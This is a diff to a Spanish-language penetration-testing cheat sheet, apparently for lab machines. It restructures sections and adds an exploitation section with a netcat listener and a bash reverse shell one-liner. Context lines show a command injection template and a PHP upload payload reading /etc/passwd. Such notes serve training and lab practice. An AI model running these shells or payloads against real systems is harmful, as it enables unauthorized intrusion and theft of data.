@@ -18,7 +18,7 @@ Ejemplo formato URL:
 http://www.example.com:80/path/to/file.html?key1=value1&key2=value2#ID
 ```
 
-## Comandos críticos
+## VPN
 
 Conexión VPN:
 
@@ -30,12 +30,6 @@ Obtener IP local:
 
 ```bash
 ip a show tun0
-```
-
-Esperar conexión:
-
-```bash
-nc -lvnp 9001
 ```
 
 ## Metodología
@@ -51,7 +45,7 @@ ping -c 1 10.10.10.10
 Descubrir puertos (80=http, 443=https):
 
 ```bash
-sudo nmap -sT -vvv -oN scan.txt -Pn -p21,22,80,111,389,1883,2718,3000,4000,4567,5000,5050,5572,5672,5678,6379,8000,8080,8081,8161,8443,9000,61613,61614,61616 10.10.10.10
+sudo nmap -sT -v -oN scan.txt -Pn -p21,22,80,111,389,1883,2718,3000,4000,4567,5000,5050,5572,5672,5678,6379,8000,8080,8081,8161,8443,9000,61613,61614,61616 10.10.10.10
 ```
 
 ### Web
@@ -90,7 +84,7 @@ IDOR:
 /account?id=3
 ```
 
-[Command injection](https://www.revshells.com):
+Command injection:
 
 ```text
 command1 $(command2)
@@ -117,7 +111,21 @@ File upload:
 <?php echo file_get_contents('/etc/passwd'); ?>
 ```
 
-### Privilege Escalation
+### Explotación
+
+Esperar conexión:
+
+```bash
+nc -lvnp 9001
+```
+
+[Reverse shell](https://www.revshells.com/):
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
+```
+
+### Escalamiento de Privilegios
 
 Tratamiento de la TTY: <https://invertebr4do.github.io/tratamiento-de-tty/>
 
@@ -130,5 +138,5 @@ sudo -l
 Encontrar binarios SUID:
 
 ```bash
-find / -perm -u=s 2>/dev/null
+find / -perm -4000 2>/dev/null
 ```
